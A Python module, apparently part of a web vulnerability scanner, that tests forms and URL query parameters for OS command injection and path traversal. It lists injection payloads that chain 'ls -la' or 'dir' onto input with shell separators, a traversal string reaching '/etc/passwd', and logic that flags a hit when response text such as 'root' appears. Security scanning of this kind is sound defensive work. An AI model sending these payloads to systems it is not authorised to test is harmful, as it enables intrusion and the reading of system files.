import time
from itertools import product
from typing import List, Tuple, Any

from tqdm import tqdm

PAYLOADS = {
    # Bash / SH
    "; ls -la",
    "& ls -la",
    "&& ls -la",
    "| ls -la",
    "|| ls -la",
    # CSH
    "; ls -la",
    "& ls -la",
    "| ls -la",
    # Windows
    "& dir",

}

ANSWERS = {"total",
           "root",
           "Directory of"}

PAYLOADS_LINK = {
    "../../../../../../../../../etc/passwd",
}

PREFIXES = {"?name=",
            "?query=",
            "?q=",
            "?search=",
            "?search_text=",
            "?s=",
            "?s=",
            "?test=",
            "?keywords=",
            "?view=",
            "?post=",
            }


def test_command_execution_in_form(self, form: str, url: str, level: list[str], req_per_minute: int) -> List[
    Tuple[bool, str]]:
    """
    Test for command execution vulnerabilities in a web form.

    This function submits various payloads that could potentially execute shell commands on a server
    if the input is not properly sanitized. After each submission, it checks the response for a specified prefix.
    If the prefix is found in the response, the corresponding payload is added to the results.

    Args:
        form (str): The web form to test.
        url (str): The URL to submit the form to.

    Returns:
        List[Tuple[bool, str]]: A list of tuples. Each tuple contains a boolean indicating whether the prefix was found in the response,
                                 and the payload that was used.
    """

    results = []
    progress_bar = tqdm(product(ANSWERS, PAYLOADS), total=len(ANSWERS) * len(PAYLOADS),
                        bar_format="{l_bar}%s{bar}%s{r_bar}" % ('\033[96m Payloads testing --> ', ''))

    for answer, payload in progress_bar:
        # Check payload without escaping characters
        response = self.submit_form(form=form, value=payload, url=url)
        self.request_count += 1

        if not response.ok:
            self.logger.warning(f"\n{url} = {response.status_code}, {payload}")
            # continue

        if answer in response.text:
            results.append((True, payload))

        # Check payload with escaping characters
        escaped_payload = payload.replace(" ", "%20")
        response = self.submit_form(form=form, value=escaped_payload, url=url)
        self.request_count += 1

        if not response.ok:
            self.logger.warning(f"\n{url} = {response.status_code}, {payload}")
            # continue

        if answer in response.text:
            results.append((True, escaped_payload))

        if level == "easy" and any(result[0] for result in results):
            break

        if req_per_minute is not None:
            pause = 60.0 / req_per_minute
            time.sleep(pause)

    return results


def test_command_execution_in_link(self, url: str, level: list[str], req_per_minute: int) -> list[
    tuple[bool, Any, Any]]:
    results = []
    progress_bar = tqdm(product(PREFIXES, PAYLOADS_LINK, ANSWERS),
                        total=len(PREFIXES) * len(PAYLOADS_LINK) * len(ANSWERS),
                        bar_format="{l_bar}%s{bar}%s{r_bar}" % ('\033[96m Payloads testing --> ', ''))

    for prefix, payload, answer in progress_bar:
        response = self.session.get(url=f"{url}{prefix}{payload}")
        self.request_count += 1

        if not response.ok:
            self.logger.warning(f"\n{url} = {response.status_code}, {payload}")
            continue

        if answer in response.text:
            results.append((True, payload))

        if level == "easy" and any(result[0] for result in results):
            break

        if req_per_minute is not None:
            pause = 60.0 / req_per_minute
            time.sleep(pause)

    return results

# def test_command_execution_in_form(self, form: str, url: str) -> List[Tuple[bool, str]]:
#     results = []
#     for answer in ANSWERS:
#         for payload in PAYLOADS:
#
#             # Check payload without escaping characters
#             response = self.submit_form(form=form, value=payload, url=url)
#             if answer in response.text:
#                 results.append((True, payload))
#
#             # Check payload with escaping characters
#             escaped_payload = payload.replace(" ", "%20")
#             response = self.submit_form(form=form, value=escaped_payload, url=url)
#             if answer in response.text:
#                 results.append((True, escaped_payload))
#
#     return [result for result in results if result[0]]
